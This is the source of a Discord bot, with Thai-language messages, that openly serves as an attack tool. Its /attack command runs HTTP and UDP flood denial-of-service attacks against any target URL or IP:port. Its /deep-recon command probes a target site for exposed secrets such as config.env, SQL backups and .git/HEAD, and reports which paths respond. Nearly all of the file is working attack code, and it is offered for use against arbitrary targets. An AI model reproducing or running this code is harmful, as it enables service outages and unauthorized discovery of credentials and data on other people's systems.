/**
 * ============================================================================
 * JEFF FUJI - AUTONOMOUS VULN & CREDENTIAL RECON ENGINE v7
 * Developed under JARVIS x ARI Protocol
 * ============================================================================
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const http = require('http');
const https = require('https');
const dgram = require('dgram');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let isAttacking = false;
let attackTimers = [];

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000, rejectUnauthorized: false });

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder()
            .setName('attack')
            .setDescription('ยิงถล่มเป้าหมาย (L7 HTTP หรือ L4 UDP Flood)')
            .addStringOption(option => 
                option.setName('type')
                    .setDescription('เลือกโหมดการยิง')
                    .setRequired(true)
                    .addChoices(
                        { name: '🌐 L7 (HTTP/HTTPS Flood)', value: 'l7' },
                        { name: '⚡ L4 (UDP Network Flood)', value: 'l4' }
                    ))
            .addStringOption(option => 
                option.setName('target')
                    .setDescription('URL (สำหรับ L7) หรือ IP:Port (สำหรับ L4)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('duration')
                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('deep-recon')
            .setDescription('สแกนหาช่องโหว่ ไฟล์ลับ และจุดรั่วไหลของรหัสผ่านแบบอัตโนมัติเชิงลึก')
            .addStringOption(option => 
                option.setName('url')
                    .setDescription('URL เป้าหมาย (เช่น https://example.com)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('stop')
            .setDescription('หยุดการกระทำทั้งหมดทันที')
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('[+] Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[+] Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'attack') {
        const attackType = interaction.options.getString('type');
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (isAttacking) {
            return interaction.reply({ content: '⚠️ กำลังมียุทธการอื่นทำงานอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
        }

        isAttacking = true;
        const endTime = Date.now() + (duration * 1000);

        if (attackType === 'l7') {
            try {
                const parsedUrl = new URL(target);
                const requester = parsedUrl.protocol === 'https:' ? https : http;
                const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;

                await interaction.reply(`🚀 **[L7 HTTP FLOOD]** เริ่มซัด **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

                const fireL7 = () => {
                    if (!isAttacking || Date.now() >= endTime) return;

                    const options = {
                        hostname: parsedUrl.hostname,
                        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                        path: parsedUrl.pathname + parsedUrl.search,
                        method: 'GET',
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Connection': 'keep-alive'
                        },
                        agent: currentAgent
                    };

                    const req = requester.request(options, (res) => {
                        res.on('data', () => {});
                        res.on('end', () => { if (isAttacking) setImmediate(fireL7); });
                    });

                    req.on('error', () => { if (isAttacking) setImmediate(fireL7); });
                    req.end();
                };

                for (let i = 0; i < 300; i++) {
                    fireL7();
                }

            } catch (err) {
                isAttacking = false;
                return interaction.reply({ content: `❌ URL ผิดรูปแบบ: ${err.message}`, ephemeral: true });
            }

        } else if (attackType === 'l4') {
            const parts = target.split(':');
            if (parts.length !== 2) {
                isAttacking = false;
                return interaction.reply({ content: '❌ รูปแบบ L4 ต้องเป็น IP:Port เท่านั้น (เช่น 123.45.67.89:80)', ephemeral: true });
            }

            const host = parts[0];
            const port = parseInt(parts[1]);

            await interaction.reply(`🔥 **[L4 NETWORK FLOOD]** เริ่มระเบิดท่อใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

            const payload = Buffer.alloc(1024);
            for (let i = 0; i < 200; i++) {
                const clientUdp = dgram.createSocket('udp4');
                const sendUdp = () => {
                    if (!isAttacking || Date.now() >= endTime) {
                        clientUdp.close();
                        return;
                    }
                    clientUdp.send(payload, port, host, () => {
                        setImmediate(sendUdp);
                    });
                };
                sendUdp();
            }
        }

        const timer = setTimeout(() => {
            isAttacking = false;
            interaction.followUp(`✅ ภารกิจถล่ม **${target}** เสร็จสิ้นตามเวลาที่กำหนด!`).catch(() => {});
        }, duration * 1000);

        attackTimers.push(timer);

    } else if (commandName === 'deep-recon') {
        const targetUrl = interaction.options.getString('url');
        await interaction.reply(`🔍 **[DEEP RECON ENGINE]** กำลังสแกนหาไฟล์ลับ จุดรั่วไหลของรหัส และช่องโหว่เชิงลึกของ **${targetUrl}** รอแป๊บไอ้สัส...`);

        // คลังคำศัพท์เป้าหมายเจาะลึก (Wordlist สำหรับสแกนอัตโนมัติ)
        const deepWordlist = [
            '/admin', '/admin/login', '/administrator', '/login.php', '/wp-login.php',
            '/config.env', '/backup.sql', '/database.sql', '/db.bak', '/wp-config.php.bak',
            '/robots.txt', '/sitemap.xml', '/api/v1/users', '/api/v1/admin', '/products.json',
            '/.git/HEAD', '/composer.json', '/package.json', '/server-status', '/phpmyadmin'
        ];

        let findings = [];
        let checkedCount = 0;

        try {
            const parsedBase = new URL(targetUrl);

            deepWordlist.forEach((path) => {
                const testUrl = `${parsedBase.protocol}//${parsedBase.host}${path}`;
                const reqLib = parsedBase.protocol === 'https:' ? https : http;

                const req = reqLib.get(testUrl, {
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) DeepRecon/2.0' }
                }, (res) => {
                    checkedCount++;
                    // บันทึกเฉพาะจุดที่เข้าถึงได้ (200) หรือมีระบบป้องกันแต่เจอตัวตน (403)
                    if (res.statusCode === 200 || res.statusCode === 403) {
                        let tag = res.statusCode === 200 ? '🟢 [OPEN 200]' : '🟡 [LOCKED 403]';
                        findings.push(`${tag} \`${testUrl}\``);
                    }
                    if (checkedCount === deepWordlist.length) {
                        sendDeepReport();
                    }
                });

                req.on('error', () => {
                    checkedCount++;
                    if (checkedCount === deepWordlist.length) {
                        sendDeepReport();
                    }
                });
                req.end();
            });

            async function sendDeepReport() {
                const embed = new EmbedBuilder()
                    .setTitle('💀 Deep Vulnerability & Credential Recon Report')
                    .setColor(findings.length > 0 ? 0x22c55e : 0xef4444)
                    .setDescription(findings.length > 0 ? findings.join('\n') : '❌ ไม่พบไฟล์ลับหรือจุดอ่อนสำคัญในรายการสแกนเชิงลึก')
                    .addFields(
                        { name: 'Target Analyzed', value: targetUrl },
                        { name: 'Total Paths Checked', value: `${deepWordlist.length} Endpoints` },
                        { name: 'Engine Status', value: '🟢 Deep Scan Completed' }
                    )
                    .setTimestamp();

                await interaction.followUp({ embeds: [embed] });
            }

        } catch (err) {
            await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
        }

    } else if (commandName === 'stop') {
        if (!isAttacking) {
            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังทำงานอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
        }

        isAttacking = false;
        attackTimers.forEach(t => clearTimeout(t));
        attackTimers = [];

        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
    }
});

client.login(TOKEN);
